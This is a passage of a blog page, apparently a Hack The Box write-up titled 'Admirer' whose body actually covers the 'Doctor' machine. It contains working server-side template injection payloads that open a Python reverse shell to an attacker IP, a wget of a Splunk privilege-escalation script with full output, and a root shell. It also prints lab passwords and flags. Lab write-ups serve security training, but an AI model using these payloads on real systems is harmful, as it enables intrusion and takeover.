@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Admirer | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="https://maggick.fr/theme/css/pure-min.css">
+    <link rel="stylesheet" href="https://maggick.fr/theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="https://maggick.fr/index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="https://maggick.fr/pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="https://maggick.fr/pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="https://maggick.fr/2021/02/htb-admirer.html" title="Read more" class="entry-title-link">
+                HTB: Admirer</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2021-02-07T18:15:00+01:00">07 Feb 2021</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="https://maggick.fr/author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="https://maggick.fr/tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="https://maggick.fr/tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="https://maggick.fr/tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="https://maggick.fr/tag/linux.html" title="Read more with the label linux" class="meta-link">linux</a> 
+          <a href="https://maggick.fr/tag/ssti.html" title="Read more with the label SSTI" class="meta-link">SSTI</a> 
+          <a href="https://maggick.fr/tag/splunk.html" title="Read more with the label Splunk" class="meta-link">Splunk</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 8 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2021.02/doctor_card.png" alt="Doctor card" width="262"></p>
+<p>This is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/278">Doctor</a> created by
+<a href="https://www.hackthebox.eu/home/users/profile/94858">egotisticalSW</a>
+and publish on September 26, 2020.
+This box is classified as an easy machine. The user part implied a server side
+template injection and finding a needle in a haystack. The root part required to
+use a Splunk exploit to elevate our privileges.</p>
+
+
+<h1 id="user">User</h1>
+<h2 id="recon">Recon</h2>
+<p>We start with an nmap scan. Only the ports 22 (SSH), 80 (HTTP) and 8080 (splunk web interface) are open.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Mon Sep 28 06:35:31 2020 as: nmap -p- -oN nmap -sSV 10.10.10.209</span>
+<span class="code-line">Nmap scan report for 10.10.10.209</span>
+<span class="code-line">Host is up (0.077s latency).</span>
+<span class="code-line">Not shown: 65532 filtered ports</span>
+<span class="code-line">PORT     STATE SERVICE  VERSION</span>
+<span class="code-line">22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span>
+<span class="code-line">80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))</span>
+<span class="code-line">8089/tcp open  ssl/http Splunkd httpd</span>
+<span class="code-line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+<span class="code-line"></span>
+<span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="code-line"># Nmap done at Mon Sep 28 06:37:56 2020 -- 1 IP address (1 host up) scanned in 145.15 seconds</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="web-port-8089">Web - port 8089</h2>
+<p>On the port 8089 we have a splunk running (as found by nmap) but we don't have
+access to the different function as we don't know any credentials.</p>
+<p><img alt="Front page and contact email" src="/media/2021.02/doctor_01.png"></p>
+<p>An access to this function will have allowed us to
+<a href="https://github.com/cnotin/SplunkWhisperer2">have a remote code execution on the server</a>
+or <a href="https://github.com/tevora-threat/splunk_local_privesc">allowed us to elevate our privileges on the box</a>.</p>
+<h2 id="web-port-80">Web - port 80</h2>
+<p>The website is about healthcare and doctors. We also see an email contact address
+on the front page with the domain <em>doctors.htb</em> (note the <em>s</em> at the end).</p>
+<p><img alt="Front page and contact email" src="/media/2021.02/doctor_01.png"></p>
+<p>We had the domain to <code>/etc/hosts</code> and browse to it. The website is a "secure"
+messaging application with a self sign-in function.</p>
+<p><img alt="Doctor Secure Messaging" src="/media/2021.02/doctor_02.png"></p>
+<p>We create an account and post a message.</p>
+<p><img alt="Doctor Secure Messaging" src="/media/2021.02/doctor_03.png"></p>
+<p>When looking at the page source code we found a comment about the archive
+function:
+<code>&lt;!--archive still under beta testing&lt;a class="nav-item nav-link" href="/archive"&gt;Archive&lt;/a&gt;--&gt;</code></p>
+<h3 id="ssti">SSTI</h3>
+<p>We check for common vulnerabilities and found out that the application is
+vulnerable to <a href="https://portswigger.net/web-security/server-side-template-injection">server side template injection</a>
+in the title as when our title is <code>{{7*7}}</code> when can see the operation result
+(49) in the archive.</p>
+<p><img alt="Message with SSTI test payload" src="/media/2021.02/doctor_04.png"></p>
+<p><img alt="Payload executed in the archive section" src="/media/2021.02/doctor_05.png"></p>
+<p>We can use this injection to <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">execute command on the system</a>.
+After a few test we know that python is on the box and can run a few commands.
+The payload below runs <code>id</code>.</p>
+<p><code>{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.121\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/id\"]);'").read().zfill(417)}}{%endif%}{% endfor %}</code></p>
+<p>We (obviously) run a netcat listener to catch the command's output.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~/pown/htb_doctor$ nc -l -p 4444</span>
+<span class="code-line">uid=1001(web) gid=1001(web) groups=1001(web),4(adm)</span>
+<span class="code-line"></code></pre></div>
+
+<p>We then go for a reverse shell with the following payload be careful with the
+quotes and escaped quotes).</p>
+<p><code>{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.121\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn(\"/bin/bash\");'").read().zfill(417)}}{%endif%}{% endfor %}</code></p>
+<p>That allow us to get a reverse shell on the box.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>After <em>a lot</em> of enumeration both
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">manually</a>
+and using tools as
+<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">linPEAS</a>
+we found out that there is <code>backup</code> file in <code>/var/log/apache2</code> containing a call
+to the password reset function but the user put its password instead of its
+email.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>web@doctor:/var/log/apache2$ grep password backup</span>
+<span class="code-line">grep password backup</span>
+<span class="code-line">10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] &quot;POST /reset_password?email=Guitar123&quot; 500 453 &quot;http://doctor.htb/reset_password&quot;</span>
+<span class="code-line"></code></pre></div>
+
+<p>That password allow us to connect as <code>shaun</code> using the switch user <code>su</code> command
+and get the user flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>web@doctor:/var/log/apache2$ su shaun</span>
+<span class="code-line">su shaun</span>
+<span class="code-line">Password: Guitar123</span>
+<span class="code-line"></span>
+<span class="code-line">shaun@doctor:/var/log/apache2$ cat /home/shaun/user.txt</span>
+<span class="code-line">cat /home/shaun/user.txt</span>
+<span class="code-line">2b14d9d9ff996cfb2e4fb96e6db82631</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="root">Root</h1>
+<p>Now that we have a username and a password we can try them against the Splunk
+service. And they are working!</p>
+<p>We transfer the <a href="https://github.com/tevora-threat/splunk_local_privesc">script mentioned above</a>
+to the box using <code>python -m http.server</code> on our kali box.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>shaun@doctor:/tmp$ wget 10.10.14.121:8000/spelunker.sh</span>
+<span class="code-line">wget 10.10.14.121:8000/spelunker.sh</span>
+<span class="code-line">--2020-09-29 11:22:03--  http://10.10.14.121:8000/spelunker.sh</span>
+<span class="code-line">Connecting to 10.10.14.121:8000... connected.</span>
+<span class="code-line">HTTP request sent, awaiting response... 200 OK</span>
+<span class="code-line">Length: 2503 (2,4K) [text/x-sh]</span>
+<span class="code-line">Saving to: ‘spelunker.sh.1’</span>
+<span class="code-line"></span>
+<span class="code-line">spelunker.sh.1      100%[===================&gt;]   2,44K  --.-KB/s    in 0s</span>
+<span class="code-line"></span>
+<span class="code-line">2020-09-29 11:22:03 (254 MB/s) - ‘spelunker.sh.1’ saved [2503/2503]</span>
+<span class="code-line"></code></pre></div>
+
+<p>Then, we give the execution permission to the script and run it.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>shaun@doctor:/tmp$ chmod +x spelunker.sh.1</span>
+<span class="code-line">chmod +x spelunker.sh.1</span>
+<span class="code-line">shaun@doctor:/tmp$ ./spelunker.sh.1</span>
+<span class="code-line">./spelunker.sh.1</span>
+<span class="code-line"></span>
+<span class="code-line">[!] SPLUNK LOCAL PRIVESC [!]</span>
+<span class="code-line">[!] This tool assumes the creds are admin:changeme</span>
+<span class="code-line">[!] and the port is 8089</span>
+<span class="code-line"></span>
+<span class="code-line">[*] Creating a tmp workspace and moving there...</span>
+<span class="code-line"></span>
+<span class="code-line">[*] Creating the splunk app...</span>
+<span class="code-line"></span>
+<span class="code-line">[*] Creating the payload...</span>
+<span class="code-line"></span>
+<span class="code-line">Tarballing the App and removing temp files...</span>
+<span class="code-line">./APPY/</span>
+<span class="code-line">./APPY/bin/</span>
+<span class="code-line">./APPY/bin/pay.sh</span>
+<span class="code-line">./APPY/local/</span>
+<span class="code-line">./APPY/local/inputs.conf</span>
+<span class="code-line">[*] App should be created...</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">[*] Installing the malicious splunk app....</span>
+<span class="code-line">HTTP/1.1 201 Created</span>
+<span class="code-line">Date: Tue, 29 Sep 2020 09:22:31 GMT</span>
+<span class="code-line">Expires: Thu, 26 Oct 1978 00:00:00 GMT</span>
+<span class="code-line">Cache-Control: no-store, no-cache, must-revalidate, max-age=0</span>
+<span class="code-line">Content-Type: text/xml; charset=UTF-8</span>
+<span class="code-line">X-Content-Type-Options: nosniff</span>
+<span class="code-line">Content-Length: 4342</span>
+<span class="code-line">Vary: Cookie, Authorization</span>
+<span class="code-line">Connection: Close</span>
+<span class="code-line">X-Frame-Options: SAMEORIGIN</span>
+<span class="code-line">Server: Splunkd</span>
+<span class="code-line"></span>
+<span class="code-line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<span class="code-line">&lt;?xml-stylesheet type=&quot;text/xml&quot; href=&quot;/static/atom.xsl&quot;?&gt;</span>
+<span class="code-line">&lt;feed xmlns=&quot;http://www.w3.org/2005/Atom&quot; xmlns:s=&quot;http://dev.splunk.com/ns/rest&quot; xmlns:opensearch=&quot;http://a9.com/-/spec/opensearch/1.1/&quot;&gt;</span>
+<span class="code-line">  &lt;title&gt;localapps&lt;/title&gt;</span>
+<span class="code-line">  &lt;id&gt;https://127.0.0.1:8089/services/apps/local&lt;/id&gt;</span>
+<span class="code-line">  &lt;updated&gt;2020-09-29T11:22:31+02:00&lt;/updated&gt;</span>
+<span class="code-line">  &lt;generator build=&quot;a1a6394cc5ae&quot; version=&quot;8.0.5&quot;/&gt;</span>
+<span class="code-line">  &lt;author&gt;</span>
+<span class="code-line">    &lt;name&gt;Splunk&lt;/name&gt;</span>
+<span class="code-line">  &lt;/author&gt;</span>
+<span class="code-line">  &lt;link href=&quot;/services/apps/local/_new&quot; rel=&quot;create&quot;/&gt;</span>
+<span class="code-line">  &lt;link href=&quot;/services/apps/local/_reload&quot; rel=&quot;_reload&quot;/&gt;</span>
+<span class="code-line">  &lt;opensearch:totalResults&gt;1&lt;/opensearch:totalResults&gt;</span>
+<span class="code-line">  &lt;opensearch:itemsPerPage&gt;30&lt;/opensearch:itemsPerPage&gt;</span>
+<span class="code-line">  &lt;opensearch:startIndex&gt;0&lt;/opensearch:startIndex&gt;</span>
+<span class="code-line">  &lt;s:messages/&gt;</span>
+<span class="code-line">  &lt;entry&gt;</span>
+<span class="code-line">    &lt;title&gt;APPY&lt;/title&gt;</span>
+<span class="code-line">    &lt;id&gt;https://127.0.0.1:8089/servicesNS/nobody/system/apps/local/APPY&lt;/id&gt;</span>
+<span class="code-line">    &lt;updated&gt;1970-01-01T01:00:00+01:00&lt;/updated&gt;</span>
+<span class="code-line">    &lt;link href=&quot;/servicesNS/nobody/system/apps/local/APPY&quot; rel=&quot;alternate&quot;/&gt;</span>
+<span class="code-line">    &lt;author&gt;</span>
+<span class="code-line">      &lt;name&gt;nobody&lt;/name&gt;</span>
+<span class="code-line">    &lt;/author&gt;</span>
+<span class="code-line">    &lt;link href=&quot;/servicesNS/nobody/system/apps/local/APPY&quot; rel=&quot;list&quot;/&gt;</span>
+<span class="code-line">    &lt;link href=&quot;/servicesNS/nobody/system/apps/local/APPY/_reload&quot; rel=&quot;_reload&quot;/&gt;</span>
+<span class="code-line">    &lt;link href=&quot;/servicesNS/nobody/system/apps/local/APPY&quot; rel=&quot;edit&quot;/&gt;</span>
+<span class="code-line">    &lt;link href=&quot;/servicesNS/nobody/system/apps/local/APPY&quot; rel=&quot;remove&quot;/&gt;</span>
+<span class="code-line">    &lt;link href=&quot;/servicesNS/nobody/system/apps/local/APPY/package&quot; rel=&quot;package&quot;/&gt;</span>
+<span class="code-line">    &lt;content type=&quot;text/xml&quot;&gt;</span>
+<span class="code-line">      &lt;s:dict&gt;</span>
+<span class="code-line">        &lt;s:key name=&quot;check_for_updates&quot;&gt;1&lt;/s:key&gt;</span>
+<span class="code-line">        &lt;s:key name=&quot;configured&quot;&gt;0&lt;/s:key&gt;</span>
+<span class="code-line">        &lt;s:key name=&quot;core&quot;&gt;0&lt;/s:key&gt;</span>
+<span class="code-line">        &lt;s:key name=&quot;disabled&quot;&gt;0&lt;/s:key&gt;</span>
+<span class="code-line">        &lt;s:key name=&quot;eai:acl&quot;&gt;</span>
+<span class="code-line">          &lt;s:dict&gt;</span>
+<span class="code-line">            &lt;s:key name=&quot;app&quot;&gt;system&lt;/s:key&gt;</span>
+<span class="code-line">            &lt;s:key name=&quot;can_change_perms&quot;&gt;1&lt;/s:key&gt;</span>
+<span class="code-line">            &lt;s:key name=&quot;can_list&quot;&gt;1&lt;/s:key&gt;</span>
+<span class="code-line">            &lt;s:key name=&quot;can_share_app&quot;&gt;1&lt;/s:key&gt;</span>
+<span class="code-line">            &lt;s:key name=&quot;can_share_global&quot;&gt;1&lt;/s:key&gt;</span>
+<span class="code-line">            &lt;s:key name=&quot;can_share_user&quot;&gt;0&lt;/s:key&gt;</span>
+<span class="code-line">            &lt;s:key name=&quot;can_write&quot;&gt;1&lt;/s:key&gt;</span>
+<span class="code-line">            &lt;s:key name=&quot;modifiable&quot;&gt;1&lt;/s:key&gt;</span>
+<span class="code-line">            &lt;s:key name=&quot;owner&quot;&gt;nobody&lt;/s:key&gt;</span>
+<span class="code-line">            &lt;s:key name=&quot;perms&quot;&gt;</span>
+<span class="code-line">              &lt;s:dict&gt;</span>
+<span class="code-line">                &lt;s:key name=&quot;read&quot;&gt;</span>
+<span class="code-line">                  &lt;s:list&gt;</span>
+<span class="code-line">                    &lt;s:item&gt;*&lt;/s:item&gt;</span>
+<span class="code-line">                  &lt;/s:list&gt;</span>
+<span class="code-line">                &lt;/s:key&gt;</span>
+<span class="code-line">                &lt;s:key name=&quot;write&quot;&gt;</span>
+<span class="code-line">                  &lt;s:list&gt;</span>
+<span class="code-line">                    &lt;s:item&gt;*&lt;/s:item&gt;</span>
+<span class="code-line">                  &lt;/s:list&gt;</span>
+<span class="code-line">                &lt;/s:key&gt;</span>
+<span class="code-line">              &lt;/s:dict&gt;</span>
+<span class="code-line">            &lt;/s:key&gt;</span>
+<span class="code-line">            &lt;s:key name=&quot;removable&quot;&gt;0&lt;/s:key&gt;</span>
+<span class="code-line">            &lt;s:key name=&quot;sharing&quot;&gt;app&lt;/s:key&gt;</span>
+<span class="code-line">          &lt;/s:dict&gt;</span>
+<span class="code-line">        &lt;/s:key&gt;</span>
+<span class="code-line">        &lt;s:key name=&quot;install_source_checksum&quot;&gt;3d642ab909020d9844b47dbf1a38c77cf7b9e0a0&lt;/s:key&gt;</span>
+<span class="code-line">        &lt;s:key name=&quot;label&quot;&gt;APPY&lt;/s:key&gt;</span>
+<span class="code-line">        &lt;s:key name=&quot;location&quot;&gt;/opt/splunkforwarder/etc/apps/APPY&lt;/s:key&gt;</span>
+<span class="code-line">        &lt;s:key name=&quot;managed_by_deployment_client&quot;&gt;0&lt;/s:key&gt;</span>
+<span class="code-line">        &lt;s:key name=&quot;name&quot;&gt;APPY&lt;/s:key&gt;</span>
+<span class="code-line">        &lt;s:key name=&quot;show_in_nav&quot;&gt;1&lt;/s:key&gt;</span>
+<span class="code-line">        &lt;s:key name=&quot;source_location&quot;&gt;/opt/splunkforwarder/etc/apps/APPY&lt;/s:key&gt;</span>
+<span class="code-line">        &lt;s:key name=&quot;state_change_requires_restart&quot;&gt;0&lt;/s:key&gt;</span>
+<span class="code-line">        &lt;s:key name=&quot;status&quot;&gt;installed&lt;/s:key&gt;</span>
+<span class="code-line">        &lt;s:key name=&quot;visible&quot;&gt;0&lt;/s:key&gt;</span>
+<span class="code-line">      &lt;/s:dict&gt;</span>
+<span class="code-line">    &lt;/content&gt;</span>
+<span class="code-line">  &lt;/entry&gt;</span>
+<span class="code-line">&lt;/feed&gt;</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">[*] Removing the malicious splunk app...</span>
+<span class="code-line">HTTP/1.1 200 OK</span>
+<span class="code-line">Date: Tue, 29 Sep 2020 09:22:44 GMT</span>
+<span class="code-line">Expires: Thu, 26 Oct 1978 00:00:00 GMT</span>
+<span class="code-line">Cache-Control: no-store, no-cache, must-revalidate, max-age=0</span>
+<span class="code-line">Content-Type: text/xml; charset=UTF-8</span>
+<span class="code-line">X-Content-Type-Options: nosniff</span>
+<span class="code-line">Content-Length: 1797</span>
+<span class="code-line">Vary: Cookie, Authorization</span>
+<span class="code-line">Connection: Close</span>
+<span class="code-line">X-Frame-Options: SAMEORIGIN</span>
+<span class="code-line">Server: Splunkd</span>
+<span class="code-line"></span>
+<span class="code-line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<span class="code-line">&lt;!--This is to override browser formatting; see server.conf[httpServer] to disable. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .--&gt;</span>
+<span class="code-line">&lt;?xml-stylesheet type=&quot;text/xml&quot; href=&quot;/static/atom.xsl&quot;?&gt;</span>
+<span class="code-line">&lt;feed xmlns=&quot;http://www.w3.org/2005/Atom&quot; xmlns:s=&quot;http://dev.splunk.com/ns/rest&quot; xmlns:opensearch=&quot;http://a9.com/-/spec/opensearch/1.1/&quot;&gt;</span>
+<span class="code-line">  &lt;title&gt;localapps&lt;/title&gt;</span>
+<span class="code-line">  &lt;id&gt;https://127.0.0.1:8089/services/apps/local&lt;/id&gt;</span>
+<span class="code-line">  &lt;updated&gt;2020-09-29T11:22:44+02:00&lt;/updated&gt;</span>
+<span class="code-line">  &lt;generator build=&quot;a1a6394cc5ae&quot; version=&quot;8.0.5&quot;/&gt;</span>
+<span class="code-line">  &lt;author&gt;</span>
+<span class="code-line">    &lt;name&gt;Splunk&lt;/name&gt;</span>
+<span class="code-line">  &lt;/author&gt;</span>
+<span class="code-line">  &lt;link href=&quot;/services/apps/local/_new&quot; rel=&quot;create&quot;/&gt;</span>
+<span class="code-line">  &lt;link href=&quot;/services/apps/local/_reload&quot; rel=&quot;_reload&quot;/&gt;</span>
+<span class="code-line">  &lt;opensearch:totalResults&gt;0&lt;/opensearch:totalResults&gt;</span>
+<span class="code-line">  &lt;opensearch:itemsPerPage&gt;30&lt;/opensearch:itemsPerPage&gt;</span>
+<span class="code-line">  &lt;opensearch:startIndex&gt;0&lt;/opensearch:startIndex&gt;</span>
+<span class="code-line">  &lt;s:messages/&gt;</span>
+<span class="code-line">&lt;/feed&gt;</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">[!] If all went well run /tmp/.tester/bin/shdoor -p for a root shell</span>
+<span class="code-line">[!] Run whoami if your prompt didn&#39;t change...</span>
+<span class="code-line"></span>
+<span class="code-line">[!] DELETE THE .tester DIRECTORY AS ROOT WHEN YOU&#39;RE DONE! [!]</span>
+<span class="code-line"></code></pre></div>
+
+<p>We then run the binary <code>shdoor</code> and get a root shell allowing us to retrive the
+root flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="err">shaun@doctor:/tmp$ /tmp/.tester/bin/shdoor -p</span></span>
+<span class="code-line"><span class="err">/tmp/.tester/bin/shdoor -p</span></span>
+<span class="code-line"><span class="err"># id</span></span>
+<span class="code-line"><span class="err">id</span></span>
+<span class="code-line"><span class="err">uid=1002(shaun) gid=1002(shaun) euid=0(root) groups=1002(shaun)</span></span>
+<span class="code-line"><span class="err"># cat /root/root.txt</span></span>
+<span class="code-line"><span class="err">cat /root/root.txt</span></span>
+<span class="code-line"><span class="err">d32cd0d4b24856</span></span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="wrapping-up">Wrapping up</h1>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="https://maggick.fr/2020/08/htb-magic.html"> HTB: Magic </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="https://maggick.fr/2020/10/htb-cache.html"> HTB: Cache </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = "matthieukeller";
+        var disqus_identifier = "2021/02/htb-admirer.html";
+
+        (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/windows.html">Windows</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/git.html">git</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bloodhound.html">bloodhound</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/procdump.html">procdump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/code-review.html">code review</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-2">
